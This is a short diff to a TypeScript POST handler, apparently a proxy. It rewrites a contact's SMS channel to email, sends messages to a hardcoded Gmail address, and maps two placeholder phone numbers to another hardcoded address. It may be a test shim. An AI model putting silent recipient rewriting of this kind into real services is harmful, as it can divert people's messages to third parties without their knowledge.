@@ -74,8 +74,17 @@ accept-encoding: gzip
 */
 export async function POST(request: Request) {
 	const body = await request.json();
+
+	const originSMS = body.contacts[0].identifier;
+
 	body.contacts[0].channel = 'email';
 	body.contacts[0].identifier = 'tonyasimmysb57@gmail.com';
+
+	if (originSMS == "7561111111") {
+		body.contacts[0].identifier = 'rivendell680@gmail.com';
+	} else if (originSMS == "7562222222") {
+		body.contacts[0].identifier = 'rivendell680@gmail.com';
+	}
 
 	const requestHeaders = extractAndModifyHeaders(request, process.env.API_URL || '');
 
